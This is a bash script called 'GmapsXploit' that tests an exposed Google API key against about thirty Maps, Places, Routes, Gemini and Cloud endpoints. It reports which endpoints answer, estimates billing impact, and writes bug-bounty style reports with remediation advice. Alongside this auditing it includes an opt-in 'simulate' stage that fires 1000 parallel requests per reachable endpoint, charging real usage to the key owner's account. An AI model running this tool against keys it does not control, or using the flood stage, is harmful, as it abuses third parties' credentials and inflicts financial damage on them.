#!/usr/bin/env bash
#
# GmapsXploit - Google API key auditor.
#
# Tests an exposed Google API key across Maps, Places, Roads, the newer Routes
# and Aerial View endpoints, and several Cloud services, then reports the
# reachable surface and the billing impact.
#
# Author: D34thSh0tX_X (github.com/DeathShotXD)
# License: MIT

set -u -o pipefail

VERSION="2026.3"
TIMEOUT=10
SIMULATE=0
SIM_COUNT=1000
OUT_DIR="."
COLOR=1
QUIET=0
API_KEY=""

# --- colors ----------------------------------------------------------------

setup_colors() {
    if [[ "$COLOR" -eq 0 || ! -t 1 ]]; then
        RED=""; GREEN=""; YELLOW=""; BLUE=""; BOLD=""; NC=""
    else
        RED=$'\e[1;31m'; GREEN=$'\e[1;32m'; YELLOW=$'\e[1;33m'
        BLUE=$'\e[1;34m'; BOLD=$'\e[1m'; NC=$'\e[0m'
    fi
}

info()  { [[ "$QUIET" -eq 1 ]] || echo -e "${BLUE}[*]${NC} $*"; }
warn()  { [[ "$QUIET" -eq 1 ]] || echo -e "${YELLOW}[!]${NC} $*"; }
ok()    { echo -e "${GREEN}[+]${NC} $*"; }
fail()  { echo -e "${RED}[-]${NC} $*"; }
hit()   { echo -e "${RED}${BOLD}[VULNERABLE]${NC} $*"; }

usage() {
    cat <<EOF
GmapsXploit ${VERSION} - Google API key auditor

Usage:
  GmapsXploit.sh [options]

Options:
  -k, --key KEY        API key to audit (prompted if omitted)
  -o, --out DIR        output directory (default: .)
  -t, --timeout SEC    request timeout (default: 10)
  -s, --simulate       opt-in billing simulation against vulnerable endpoints
  -n, --count N        requests per endpoint for the simulation (default: 1000)
      --no-color       disable colored output
  -q, --quiet          suppress informational output
  -v, --version        print the version and exit
  -h, --help           show this help
EOF
}

version() { echo "GmapsXploit ${VERSION}"; }

# --- endpoint database -----------------------------------------------------
# Format: Name|Type|BaseURL|CostPer1k

ENDPOINTS=(
    "Static Maps|IMG|https://maps.googleapis.com/maps/api/staticmap?center=45,10&zoom=7&size=400x400&key=|2.00"
    "Street View|IMG|https://maps.googleapis.com/maps/api/streetview?size=400x400&location=40.72,-73.98&fov=90&key=|7.00"
    "Geocoding|GET|https://maps.googleapis.com/maps/api/geocode/json?address=1600+Amphitheatre+Parkway,CA&key=|5.00"
    "Directions|GET|https://maps.googleapis.com/maps/api/directions/json?origin=Disneyland&destination=Universal&key=|5.00"
    "Distance Matrix|GET|https://maps.googleapis.com/maps/api/distancematrix/json?units=imperial&origins=DC&destinations=NY&key=|5.00"
    "Elevation|GET|https://maps.googleapis.com/maps/api/elevation/json?locations=39.73,-104.98&key=|5.00"
    "Timezone|GET|https://maps.googleapis.com/maps/api/timezone/json?location=39.6,-119.6&timestamp=1331161200&key=|5.00"
    "Find Place|GET|https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=Museum&inputtype=textquery&fields=name,rating&key=|17.00"
    "Autocomplete|GET|https://maps.googleapis.com/maps/api/place/autocomplete/json?input=Paris&key=|2.83"
    "Place Details|GET|https://maps.googleapis.com/maps/api/place/details/json?place_id=ChIJN1t_tDeuEmsRUsoyG83frY4&fields=name,rating&key=|17.00"
    "Nearby Search|GET|https://maps.googleapis.com/maps/api/place/nearbysearch/json?location=-33,151&radius=1500&type=restaurant&key=|32.00"
    "Text Search|GET|https://maps.googleapis.com/maps/api/place/textsearch/json?query=restaurants+in+Sydney&key=|32.00"
    "Place Photo|IMG|https://maps.googleapis.com/maps/api/place/photo?maxwidth=400&photoreference=CnRtAAAATY6p_z_S48W_9Ope963X3ZfM3A&key=|7.00"
    "Nearest Roads|GET|https://roads.googleapis.com/v1/nearestRoads?points=60.1,24.9|60.1,24.9&key=|10.00"
    "Snap to Roads|GET|https://roads.googleapis.com/v1/snaptoroads?path=-35.2,149.1|-35.2,149.1&interpolate=true&key=|10.00"
    "Speed Limits|GET|https://roads.googleapis.com/v1/speedLimits?path=38.7,-9.0&key=|20.00"
    "Air Quality|POST|https://airquality.googleapis.com/v1/currentConditions:lookup?key=|5.00"
    "Compute Routes|POST|https://routes.googleapis.com/directions/v2:computeRoutes?key=|5.00"
    "Aerial View|POST|https://aerialview.googleapis.com/v1/videos:lookup?key=|16.00"
    "Address Validation|POST|https://addressvalidation.googleapis.com/v1:validateAddress?key=|14.00"
    "Geolocation|POST|https://www.googleapis.com/geolocation/v1/geolocate?key=|5.00"
    "Firebase Dynamic Links|POST|https://firebasedynamiclinks.googleapis.com/v1/shortLinks?key=|0.00"
    "Gemini Generate|POST|https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=|12.00"
    "Gemini List Models|GET|https://generativelanguage.googleapis.com/v1beta/models?key=|12.00"
    "Gemini Files|GET|https://generativelanguage.googleapis.com/v1beta/files?key=|12.00"
    "Gemini Cached Contents|GET|https://generativelanguage.googleapis.com/v1beta/cachedContents?key=|12.00"
    "Cloud Vision|POST|https://vision.googleapis.com/v1/images:annotate?key=|1.50"
    "Cloud Translation|GET|https://translation.googleapis.com/language/translate/v2?q=hello&target=es&key=|20.00"
    "Custom Search|GET|https://www.googleapis.com/customsearch/v1?q=pwned&cx=test&key=|5.00"
    "Pollen Forecast|POST|https://pollen.googleapis.com/v1/forecast:lookup?key=|5.00"
    "Places Aggregate|GET|https://maps.googleapis.com/maps/api/place/aggregate/json?key=|32.00"
)

post_body() {
    case "$1" in
        *Gemini*)           echo '{"contents":[{"parts":[{"text":"Hi"}]}]}' ;;
        *Firebase*)         echo '{"longDynamicLink":"http://example.com"}' ;;
        *Vision*)           echo '{"requests":[{"features":[{"type":"LABEL_DETECTION"}],"image":{"source":{"imageUri":"http://example.com/img.jpg"}}}]}' ;;
        *"Air Quality"*)    echo '{"location":{"latitude":40.7128,"longitude":-74.0060}}' ;;
        *"Compute Routes"*) echo '{"origin":{"location":{"latLng":{"latitude":37.419734,"longitude":-122.0827784}}},"destination":{"location":{"latLng":{"latitude":37.7749,"longitude":-122.4194}}},"travelMode":"DRIVE"}' ;;
        *"Aerial View"*)    echo '{"location":{"latitude":37.7749,"longitude":-122.4194}}' ;;
        *"Address Validation"*) echo '{"address":{"regionCode":"US","postalCode":"94043","addressLines":["1600 Amphitheatre Parkway"]}}' ;;
        *Pollen*)           echo '{"location":{"latitude":40.7128,"longitude":-74.0060}}' ;;
        *)                  echo '{}' ;;
    esac
}

# --- argument parsing ------------------------------------------------------

while [[ $# -gt 0 ]]; do
    case "$1" in
        -k|--key)      API_KEY="${2:-}"; shift 2 ;;
        -o|--out)      OUT_DIR="${2:-.}"; shift 2 ;;
        -t|--timeout)  TIMEOUT="${2:-10}"; shift 2 ;;
        -s|--simulate) SIMULATE=1; shift ;;
        -n|--count)    SIM_COUNT="${2:-1000}"; shift 2 ;;
        --no-color)    COLOR=0; shift ;;
        -q|--quiet)    QUIET=1; shift ;;
        -v|--version)  version; exit 0 ;;
        -h|--help)     usage; exit 0 ;;
        *) echo "unknown option: $1" >&2; usage; exit 2 ;;
    esac
done

setup_colors
mkdir -p "$OUT_DIR" || { echo "cannot create $OUT_DIR" >&2; exit 1; }

if ! command -v curl >/dev/null 2>&1; then
    fail "curl is required"
    exit 1
fi

if [[ -z "$API_KEY" ]]; then
    read -rp "Enter target API key: " API_KEY
fi
if [[ -z "$API_KEY" ]]; then
    fail "no API key given"
    exit 1
fi

# --- stage 1: reconnaissance ----------------------------------------------

echo -e "${BLUE}GmapsXploit ${VERSION}${NC}"
echo -e "${BLUE}[ RECON ] -> [ ENUMERATION ] -> [ ABUSE ] -> [ BILLING IMPACT ]${NC}"
echo "----------------------------------------------------------------"

VULN_NAMES=()
VULN_URLS=()
VULN_COSTS=()
RESTRICTED=0
CLEAN=0

for entry in "${ENDPOINTS[@]}"; do
    IFS="|" read -r name type base price <<< "$entry"
    url="${base}${API_KEY}"
    printf "[*] %-24s " "$name"

    if [[ "$type" == "POST" ]]; then
        body="$(post_body "$name")"
        response="$(curl -s -m "$TIMEOUT" -X POST "$url" -H "Content-Type: application/json" -d "$body" 2>/dev/null | tr -d '\000')"
    else
        response="$(curl -s -m "$TIMEOUT" "$url" 2>/dev/null | tr -d '\000')"
    fi

    if [[ "$response" == *'"status" : "OK"'* || "$response" == *'"shortLink"'* || "$response" == *'"candidates"'* || \
          "$response" == *'"translations"'* || "$response" == *'"snappedPoints"'* || "$response" == *'"models"'* || \
          "$response" == *'"files"'* || "$response" == *'"cachedContents"'* || "$response" == *'"currentConditions"'* || \
          "$response" == *'"routes"'* ]]; then
        hit "$name"
        VULN_NAMES+=("$name"); VULN_URLS+=("$url"); VULN_COSTS+=("$price")
    elif [[ "$response" == *"referer"* ]]; then
        warn "$name - restricted (referer required)"; RESTRICTED=$((RESTRICTED + 1))
    elif [[ "$response" == *"ipAddress"* ]]; then
        warn "$name - restricted (IP required)"; RESTRICTED=$((RESTRICTED + 1))
    elif [[ "$response" == *"REQUEST_DENIED"* || "$response" == *"API_NOT_ENABLED"* ]]; then
        info "$name - not enabled"; CLEAN=$((CLEAN + 1))
    else
        info "$name - no access"; CLEAN=$((CLEAN + 1))
    fi
done

echo "----------------------------------------------------------------"
info "vulnerable: ${#VULN_NAMES[@]} | restricted: ${RESTRICTED} | no access: ${CLEAN}"

if [[ ${#VULN_NAMES[@]} -eq 0 ]]; then
    ok "No vulnerable endpoints found for this key"
    exit 0
fi

# --- stage 2: billing impact and reports -----------------------------------

echo ""
echo "Billing impact at 100k requests per endpoint:"
printf "  %-24s %-12s %s\n" "Endpoint" "Unit" "Impact"
total=0
for i in "${!VULN_NAMES[@]}"; do
    impact=$(awk -v p="${VULN_COSTS[$i]}" 'BEGIN { printf "%.2f", p * 100 }')
    total=$(awk -v t="$total" -v i="$impact" 'BEGIN { printf "%.2f", t + i }')
    printf "  %-24s \$%-11s \$%s\n" "${VULN_NAMES[$i]}" "${VULN_COSTS[$i]}" "$impact"
done
echo "  --------------------------------------------------------"
printf "  %-24s %-12s \$%s\n" "TOTAL" "" "$total"

stamp=$(date +%s)
txt="$OUT_DIR/gmapsxploit_report_${stamp}.txt"
md="$OUT_DIR/bounty_report_${stamp}.md"

{
    echo "GmapsXploit report - $(date)"
    echo "Target key: $API_KEY"
    echo "Vulnerable endpoints: ${#VULN_NAMES[@]}"
    echo ""
    for i in "${!VULN_NAMES[@]}"; do
        echo "- ${VULN_NAMES[$i]} -> ${VULN_URLS[$i]}"
    done
} > "$txt"

{
    echo "# Google API key exposure"
    echo ""
    echo "## Summary"
    echo ""
    echo "- target key: $API_KEY"
    echo "- vulnerable endpoints: ${#VULN_NAMES[@]}"
    echo "- estimated impact at 100k requests per endpoint: \$${total}"
    echo ""
    echo "## Vulnerable endpoints"
    echo ""
    for i in "${!VULN_NAMES[@]}"; do
        echo "- ${VULN_NAMES[$i]} (unit \$${VULN_COSTS[$i]}): ${VULN_URLS[$i]}"
    done
    echo ""
    echo "## Impact"
    echo ""
    echo "An unrestricted key with these APIs enabled lets a third party issue"
    echo "requests on the owner account and drive costs. The estimate above"
    echo "assumes the standard price per 1000 requests."
    echo ""
    echo "## Remediation"
    echo ""
    echo "Restrict the key by application, IP, referer, and API. Keep keys"
    echo "server-side, set quotas and budget alerts, and rotate the key."
} > "$md"

ok "report written: $txt"
ok "report written: $md"

# --- stage 3: optional billing simulation ----------------------------------

if [[ "$SIMULATE" -eq 1 ]]; then
    echo ""
    warn "Simulating ${SIM_COUNT} requests per vulnerable endpoint"
    for i in "${!VULN_NAMES[@]}"; do
        printf "[*] %s " "${VULN_NAMES[$i]}"
        for ((n = 1; n <= SIM_COUNT; n++)); do
            curl -s -o /dev/null -m "$TIMEOUT" "${VULN_URLS[$i]}" &
            if (( n % 100 == 0 )); then
                printf "."
                wait
            fi
        done
        wait
        echo " done"
    done
    ok "Simulation complete"
else
    info "Simulation skipped (enable with -s)"
fi

echo "----------------------------------------------------------------"
ok "GmapsXploit complete"
